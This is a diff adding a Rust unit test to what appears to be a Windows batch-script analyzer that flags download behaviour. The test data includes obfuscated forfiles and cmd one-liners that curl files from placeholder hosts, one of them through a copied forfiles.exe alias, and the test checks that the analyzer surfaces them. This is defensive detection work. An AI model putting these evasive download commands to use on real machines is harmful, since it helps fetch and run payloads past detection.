@@ -18871,6 +18871,27 @@ forfiles /m payload.txt /c "cmd /V:ON /c set U=https://forfiles-subst.example/@f
     }
 
     #[test]
+    fn forfiles_dot_root_placeholder_matches_current_directory_file() {
+        let script = br#"echo seed>payload.txt
+forfiles /p . /m payload.txt /c "cmd /V:ON /c set U=https://forfiles-dot-root.example/@file&&curl -o @file !U!""#;
+        let report = analyze(script, &Config::default());
+
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Download { src, dst, .. }
+                        if src == "https://forfiles-dot-root.example/payload.txt"
+                            && dst.as_deref() == Some("payload.txt")
+                )
+            }),
+            "forfiles /p . did not substitute @file for current-directory match: {:?}\n{}",
+            report.traits,
+            report.deobfuscated
+        );
+    }
+
+    #[test]
     fn copied_forfiles_alias_nested_cmd_surfaces_download_trait() {
         let script = br#"copy C:\Windows\System32\forfiles.exe C:\Users\Public\ff.tmp
 C:\Users\Public\ff.tmp /m *.txt /c "cmd /c curl -o out.exe https://copied-forfiles.example/p.exe""#;
